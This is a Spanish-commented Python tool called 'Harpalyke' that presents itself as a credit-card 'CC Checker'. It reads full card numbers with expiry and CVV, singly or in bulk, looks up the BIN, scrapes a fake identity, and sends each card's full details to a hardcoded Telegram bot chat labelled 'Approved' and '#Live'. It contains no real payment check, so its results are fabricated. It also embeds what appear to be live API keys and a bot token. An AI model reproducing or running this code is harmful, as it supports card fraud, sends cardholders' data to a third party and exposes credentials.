import requests
from lxml import html
import random
import string
import os
import shutil
import sys
import urllib.parse
import pyfiglet


def clear_cache():
    cache_file = os.path.join(os.getcwd(), "__pycache__")
    shutil.rmtree(cache_file, ignore_errors=True)


def getch():
    if os.name == 'nt':
        import msvcrt
        return msvcrt.getch().decode()
    else:
        import tty
        import termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        return ch


def run_script(cc, month, year, cvv):
    # Primera parte: Bincheck
    url = "https://bin-ip-checker.p.rapidapi.com/"

    # Solo se utilizarán los primeros 6 dígitos de la tarjeta de crédito como bin
    bin_number = cc[:6]

    querystring = {"bin": bin_number}

    payload = {"bin": bin_number}
    headers = {
        "content-type": "application/json",
        "X-RapidAPI-Key": "b8dcd5bfa8mshef84e096bb44578p114266jsnf8b4974de2b3",
        "X-RapidAPI-Host": "bin-ip-checker.p.rapidapi.com"
    }

    response = requests.post(url, json=payload, headers=headers, params=querystring)

    # Si la respuesta es exitosa, imprime los datos seleccionados
    if response.status_code == 200:
        response_json = response.json()
        bin_info = response_json['BIN']
        print('Bincheck:')
        print('Country:', bin_info['country']['name'])
        print('Brand:', bin_info['brand'])
        print('Type:', bin_info['type'])
        print('Level:', bin_info['level'])
        print('Bank:', bin_info['issuer']['name'])
        print('Currency:', bin_info['currency'])
        print('Flag:', bin_info['country']['flag'])
    else:
        print('No se pudo obtener información del bin')

    print('\nFakeit:')

    # Segunda parte: Fakeit
    url = "https://fakeit.receivefreesms.co.uk/c/us/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
                      "Chrome/83.0.4103.116 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
    }
    response = requests.get(url, headers=headers)
    data_source = response.text

    # NU BLOCK
    NU = ''.join(random.choice(string.digits) for _ in range(2))

    # NAME BLOCK
    tree = html.fromstring(data_source)
    NAME = tree.xpath(
        "/html/body/div[3]/div[1]/div/div[1]/div/div[2]/div/table/tbody/tr[1]/td[2]/span/text()")[0]

    # Replace BLOCK
    M = NAME.replace(" ", "")

    # ADDRESS BLOCK
    ADDRESS = tree.xpath(
        "/html/body/div[3]/div[1]/div/div[1]/div/div[2]/div/table/tbody/tr[2]/td[1]/span/text()")[0]

    # CITY BLOCK
    CITY = tree.xpath(
        "/html/body/div[3]/div[1]/div/div[1]/div/div[2]/div/table/tbody/tr[3]/td[1]/span/text()")[0]

    # POSTCODE BLOCK
    POSTCODE = tree.xpath(
        "/html/body/div[3]/div[1]/div/div[1]/div/div[2]/div/table/tbody/tr[3]/td[2]/span/text()")[0]

    # MAIL BLOCK
    MAIL = f"{M}{NU}@gmail.com"

    print(f"NAME: {NAME}")
    print(f"ADDRESS: {ADDRESS}")
    print(f"CITY: {CITY}")
    print(f"POSTCODE: {POSTCODE}")
    print(f"MAIL: {MAIL}")

    # Tercera parte: Enviar mensaje a Telegram
    bot_token = '6125197936:AAH2BnRO-0GkHic_WG8jQvIYQYtW4DN2n3w'
    chat_id = '6118081416' #Micropop
    #chat_id = '1456212006' #Leonardo
    text = f'<b><i>ಠ═════ಠ CC Checker ಠ═════ಠ\nಠ➣ <code>{cc}|{month}|{year}|{cvv}</code>\nಠ════════ಠ════════ಠ\nಠ➣ Status: Approved! ✅\nಠ➣ Response: Approved\nಠ➣ Gateway: Stripe\nಠ════════ಠ════════ಠ\nಠ➣ Bin: {bin_info["brand"]} - {bin_info["type"]} - {bin_info["level"]}\nಠ➣ Bank: {bin_info["issuer"]["name"]}\nಠ➣ Country: {bin_info["country"]["name"]} {bin_info["country"]["flag"]} - {bin_info["currency"]}\nಠ═════ಠ #Live ಠ═════ಠ\n• Credits : @Micropop</I></b>'
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&parse_mode=HTML&text={urllib.parse.quote_plus(text)}'
    requests.get(url)


def singularity_submenu(first_check):
    if not first_check:
        print("\nPor favor, introduzca los datos (CC|MONTH|YEAR|CVV)")
        print("\nPresione z para volver al menú principal")
        print("Presione x para finalizar el script\n")
        key = getch()
        if key == 'z':
            return "menu"
        elif key == 'x':
            return "exit"
        else:
            # Solicita los datos al usuario
            data = key + input()
            if data == "x":
                return "exit"

            try:
                # Divide los datos ingresados
                cc, month, year, cvv = data.split('|')
            except ValueError:
                print('Por favor intente de nuevo e introduzca los datos correctamente.')
                print('Toque cualquier tecla para continuar...')
                getch()
                return "continue"

            # Imprime los datos de la tarjeta de crédito en una sola línea
            print(f'\nCC: {cc} - MONTH: {month} - YEAR: {year} - CVV: {cvv}\n')

            run_script(cc, month, year, cvv)
            return "continue"
    else:
        print("\nPresione z para volver al menú principal")
        print("Presione x para finalizar el script")
        print("Presiona c para checar otra tarjeta\n")
        key = getch()
        if key == 'z':
            return "menu"
        elif key == 'x':
            return "exit"
        elif key == 'c':
            return "restart"
        else:
            return "continue"


def singularity():
    first_check = False

    while True:
        clear_cache()
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpia la pantalla

        submenu_option = singularity_submenu(first_check)

        if submenu_option == "menu":
            break
        elif submenu_option == "exit":
            sys.exit(0)
        elif submenu_option == "continue":
            first_check = True
        elif submenu_option == "restart":
            first_check = False


def blue_monday():
    clear_cache()
    os.system('cls' if os.name == 'nt' else 'clear')  # Limpia la pantalla

    # Obtener la ruta del archivo
    ruta_archivo = os.path.join(os.path.dirname(__file__), "cards.txt")

    # Verificar si el archivo existe
    if not os.path.exists(ruta_archivo):
        # Si no existe, crear el archivo y escribir un mensaje
        contenido = "Por favor, ingrese las tarjetas en el archivo cards.txt y vuelva a ejecutar la opción Blue Monday."
        with open(ruta_archivo, "w") as archivo:
            archivo.write(contenido)
        print("Archivo cards.txt creado.")
        print(f"Ruta del archivo cards.txt: {ruta_archivo}")
        return

    # Leer las tarjetas del archivo cards.txt
    with open(ruta_archivo, "r") as archivo:
        cards = archivo.readlines()

    if not cards:
        print("No hay tarjetas en el archivo cards.txt. Por favor, agregue tarjetas y vuelva a intentarlo.")
        print('Toque cualquier tecla para continuar...')
        getch()
        return

    for card in cards:
        try:
            # Divide los datos de la tarjeta
            cc, month, year, cvv = card.strip().split('|')
        except ValueError:
            print('Por favor, intente de nuevo e introduzca los datos correctamente.')
            print('Toque cualquier tecla para continuar...')
            getch()
            return

        # Imprime los datos de la tarjeta de crédito en una sola línea
        print(f'\nCC: {cc} - MONTH: {month} - YEAR: {year} - CVV: {cvv}\n')

        run_script(cc, month, year, cvv)

    print("\nSe han verificado todas las tarjetas en el archivo cards.txt.")
    print('Toque cualquier tecla para continuar...')
    getch()


def secret_submenu():
    print("\nholaxd\n")
    print("Presione z para volver al menú principal")
    print("Presione x para finalizar la script")

    key = getch()
    if key == 'z':
        return "menu"
    elif key == 'x':
        return "exit"
    else:
        return "continue"


def secret():
    while True:
        clear_cache()
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpia la pantalla

        submenu_option = secret_submenu()

        if submenu_option == "menu":
            break
        elif submenu_option == "exit":
            sys.exit(0)


def exit_program():
    sys.exit(0)


def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpia la pantalla
        ascii_banner = pyfiglet.figlet_format("Harpalyke")
        print(ascii_banner)
        print("Harpalyke is running...\n")
        print("Selecciona una opción:")
        print("1. Singularity (Una tarjeta individualmente)")
        print("2. Blue Monday (Verificar múltiples tarjetas)")
        print("3. Secret 🤫")
        print("4. Exit\n")

        option = input("Opción: ")

        if option == "1":
            singularity()
        elif option == "2":
            blue_monday()
        elif option == "3":
            secret()
        elif option == "4":
            exit_program()
        else:
            print("Opción inválida. Por favor, selecciona una opción válida.")
            getch()


# Ejecutar el programa
if __name__ == "__main__":
    main_menu()
